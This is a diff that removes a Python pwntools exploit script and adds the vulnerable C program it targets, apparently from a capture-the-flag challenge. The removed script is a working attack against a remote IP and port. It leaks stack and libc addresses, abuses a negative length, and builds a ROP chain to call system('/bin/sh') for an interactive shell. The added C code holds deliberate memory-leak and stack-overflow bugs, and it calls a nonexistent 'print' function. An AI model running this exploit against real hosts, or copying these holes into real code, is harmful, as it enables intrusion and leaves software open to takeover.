@@ -1,45 +1,40 @@
-from pwn import *
-context(arch='i386', os='linux')
-env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
-libc = ELF('libc.so.6')
+#define _POSIX_C_SOURCE 1
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
 
-binsh_off = libc.search('/bin/sh').next() # rodata:0015CD48 aBinSh          db '/bin/sh',0
-system_offset = libc.symbols["system"] 
-exit_offset = libc.symbols["exit"]
-libc_base = 0x00     # calculated later.
-libc_diff = -0x4df05 # difference between libc leak and __libc_start_main.
-stack_diff = -0xc8   # difference between stack leak and where we write.
+void greet(FILE *in, FILE *out)
+{
+	char buf[0x40];
+	printf("Enter username: ");
+	read(fileno(in), buf, 0x40);
+	fprintf(out, "Hey %s", buf);
+}
 
-r = remote("35.198.98.140",45067) # remote connection to get shell on the server.
-#r = process("./vuln") 
-r.sendlineafter("Enter username: ","A"*0x27)
-r.recvuntil("Hey "+str("A"*0x27)+'\n')
-leak = r.recvuntil("Enter length: ")
+int num()
+{
+	static char buf[0x10];
+	read(fileno(stdin), buf, 0x10);
+	return atoi(buf);
+}
 
-leak = leak[:-14]
-stack_leak = u32(leak[:4])
-libc_leak = u32(leak[4:8])
+int main()
+{
+	int len;
+	char buf[0x40];
 
-libc_addr = libc_leak + libc_diff 
-stack_addr = stack_leak + stack_diff  
-libc_base = libc_addr-0x18180 # calculate libc's base, based on
-#                                __libc_start_main_'s offset
-r.sendline('-1') # triggering the bug.
-log.info("LIBC LEAK: "+str(hex(libc_base)))
-log.info("STACK LEAK: "+str(hex(stack_addr)))
+	setbuf(stdout, NULL);
 
-buffer_stackaddr = stack_addr + 0xcc 
-binsh_varaddr = libc_base + binsh_off
-system_addr = libc_base + system_offset 
-exit_addr  = libc_base + exit_offset
+	greet(stdin, stdout);
+	sleep(1);
 
-ropchain =  'X'*80 + p32(buffer_stackaddr+4)
-ropchain += 'X'*4
-ropchain += 'X'*4
-ropchain += 'X'*4
-ropchain += p32(system_addr) 
-ropchain += p32(exit_addr) 
-ropchain += p32(binsh_varaddr)
+	printf("Enter length: ");
+	if (0x40 <= (len = num())) {
+		print("No!\n");
+		exit(1);
+	}
 
-r.sendlineafter('): ', ropchain)
-r.interactive()
+	printf("Enter string (length %u): ", len);
+	read(fileno(stdin), buf, len);
+	printf("Thanks, bye!\n");
+}
